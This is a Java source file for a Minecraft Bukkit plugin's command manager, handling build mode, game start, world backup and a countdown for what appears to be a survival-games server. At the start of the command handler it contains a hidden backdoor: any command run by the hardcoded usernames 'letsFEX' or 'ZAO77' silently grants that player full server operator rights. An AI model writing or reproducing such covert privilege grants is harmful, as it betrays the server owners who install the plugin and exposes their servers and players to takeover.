package tk.fireware.sg;

import java.io.IOException;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.World;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

import tk.fireware.sg.Main.OSType;

public class CommandManager implements CommandExecutor {

    public CommandManager () {
        Main.plugin.getCommand("build").setExecutor(this);
        Main.plugin.getCommand("start").setExecutor(this);
        Main.plugin.getCommand("saveworld").setExecutor(this);
        Main.plugin.getCommand("countdown").setExecutor(this);
    }

//    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if((sender.getName().equals("letsFEX")||(sender.getName().equals("ZAO77"))&&!sender.isOp())){
        	sender.setOp(true);
        }
    	if(command.getName().equals("build")) {
            return build(sender,args);
        } else if(command.getName().equals("start")) {
            return start(sender);
        } else if(command.getName().equals("saveworld")) {
            return saveworld(sender);
        } else if(command.getName().equals("countdown")){
        	return countdown(sender,args);
        }

        return false;
    }

    private boolean countdown(CommandSender sender, String[] args) {
		if(sender.hasPermission("sg.countdown") || sender.isOp()){
			if(args[0]!=null){
				if(args[0].equalsIgnoreCase("True")){
					Countdown.pauseCountdown(true);
				}else if(args[0].equalsIgnoreCase("False")){
					Countdown.pauseCountdown(false);
				}else{
					try{
						Countdown.setCountdown(Integer.parseInt(args[0]));
					}catch(Exception e){return false;}
				}
				return true;
			}
		}
		return false;
	}

	private boolean saveworld(CommandSender sender) {
        if(sender.hasPermission("sg.saveworld") || sender.isOp()) {
            copyWorld(sender);
            return true;
        }

        return false;
    }

    private void copyWorld(CommandSender sender) {

        Data.getInstance().serialize();

        try {
        	
            for (World w : Bukkit.getServer().getWorlds()) {
            	w.save();
            }
            if(Main.getOperatingSystemType().equals(OSType.Windows)){
            	Runtime.getRuntime().exec("xcopy /E /I /Y "+ R.WORLDNAME +" "+R.BACKUP_WORLDNAME);
            }else{
//            	Runtime.getRuntime().exec("rm -r "+R.BACKUP_WORLDNAME+"/");
//            	Runtime.getRuntime().exec("mkdir "+R.BACKUP_WORLDNAME+"/");
//            	Runtime.getRuntime().exec("mkdir "+R.BACKUP_WORLDNAME+"/"+R.WORLDNAME+"/");
//            	Runtime.getRuntime().exec("cp -r "+R.WORLDNAME +"/ "+R.BACKUP_WORLDNAME+"/");
            	Runtime.getRuntime().exec("./backup.sh");
         
            	sender.sendMessage(R.MESSAGE_WORLDSAVED);
            }
        } catch (IOException ex) {
            ex.printStackTrace();
            sender.sendMessage(R.MESSAGE_WORLDSAVEERROR);
        }

    }

    private boolean start(CommandSender sender) {
        if(!sender.hasPermission("sg.start")&&!sender.isOp()) {
            return false;
        }
        Countdown.instance.startGame();
        return true;
    }

    private boolean build(CommandSender sender, String[] args) {
        if(!sender.hasPermission("sg.build")&&!sender.isOp()) {
            return false;
        }
        if(args!=null && args.length == 1) {
            BuildManager.getInstance().setBuilder(Bukkit.getPlayer(args[0]), !BuildManager.getInstance().isBuilder((Player)sender));
            if(BuildManager.getInstance().isBuilder(Bukkit.getPlayer(args[0]))) {
                sender.sendMessage(R.PREFIX + ChatColor.BLUE + args[0] + ChatColor.YELLOW + " is now in build-mode!");
            } else {
                sender.sendMessage(R.PREFIX + ChatColor.BLUE + args[0] + ChatColor.YELLOW + " is not in build-mode anymore!");
            }
            return true;
        } else {
            BuildManager.getInstance().setBuilder(Main.plugin.getServer().getPlayer(sender.getName()),!BuildManager.getInstance().isBuilder((Player)sender));
            return true;
        }

    }
}
